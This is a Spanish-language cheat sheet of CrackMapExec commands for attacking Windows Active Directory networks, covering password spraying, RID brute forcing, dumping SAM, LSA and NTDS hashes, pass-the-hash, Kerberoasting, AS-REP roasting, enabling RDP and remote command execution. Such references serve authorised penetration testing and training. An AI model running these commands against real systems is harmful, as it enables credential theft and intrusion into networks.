# CrackMapExec Cheat Sheet

#### Listar equipos dentro de la red de un AD
```
crackmapexec smb 192.168.1.0/24
```

#### SMB con credenciales a dominio WORKGROUP
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
```

#### Password Spraying
```
crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt
```

#### Spraying Attack con usuario y contraseña lineal
```
crackmapexec smb <IP-Address> -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
```

#### Spraying Attack
```
crackmapexec smb <IP-Address> -u users.txt -p '<PASSWORD>' --continue-on-success
```

#### Conocer en que equipos se puede autenticar especificando un usuario y password
```
crackmapexec smb 192.168.1.0/24 -u '<USERNAME>' -p '<PASSWORD>'
```

#### Enumeración de directorios compartidos SMB con NULL session
```
crackmapexec smb <IP-Address> -u 'null' -p ' ' --shares
```

#### Brute Force de usuarios
```
crackmapexec smb <IP> -u 'guest' -p '' --rid-brute
```

#### Dumping Hashes SAM
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --sam
```

#### Dumping Hashes NTLM
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --ntds
```

#### Dumpear Hashes LSA
```
crackmapexec smb <IP-Address> -u 'Administrator' -p '<PASSWORD>' --lsa
```

#### Dumpear Hashes NTD
```
crackmapexec smb <IP-Address> -u 'Administrator' -H '<HASH-NT>' --ntds vss
```

#### PassTheHash
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' --local-auth
```

#### LAPS
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --laps
```

#### Fuerza bruta a Kerberos
```
crackmapexec smb <IP-Address> -u users.txt -p '' --kerberos
```

#### Ataque de Kerberoasting
```
crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPUT-FILE>
```

#### Ataque de Asreproast
```
crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
```

#### Habilitar RDP con usuario y password de Administrador
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' -M rdp -o action=enable
```

#### Ejecutar comandos usando el Hash
```
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' -d <GROUP> -x 'COMMAND'
crackmapexec smb <IP-Address> -u '<USERNAME>' -H '<HASH>' -d <GROUP> -X 'COMMAND'
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)